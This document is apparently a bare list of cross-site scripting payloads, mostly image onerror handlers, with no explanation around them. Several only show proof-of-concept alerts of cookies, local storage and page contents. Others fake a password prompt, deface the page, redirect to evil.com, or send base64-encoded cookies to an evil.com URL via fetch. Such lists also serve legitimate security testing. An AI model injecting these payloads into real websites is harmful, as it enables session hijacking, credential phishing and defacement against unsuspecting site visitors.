alert(window.origin);
<img src=x onerror="alert(document.cookie)">
<img src=x onerror="prompt('Enter your password:', '');">
<img src=x onerror="alert(JSON.stringify(localStorage))">
<img src=x onerror="alert(navigator.userAgent)">
<img src=x onerror="navigator.geolocation.getCurrentPosition(pos => alert(pos.coords.latitude + ', ' + pos.coords.longitude))">
<img src=x onerror="document.body.innerHTML='<h1>Hacked</h1>'">
<img src=x onerror="window.location='https://evil.com'">
<img src=x onerror="alert(document.documentElement.outerHTML)">
<img src=x onerror="fetch('https://evil.com/?data='+btoa(document.cookie))">
<img src=x onerror="window.open('javascript:alert(document.domain)')">
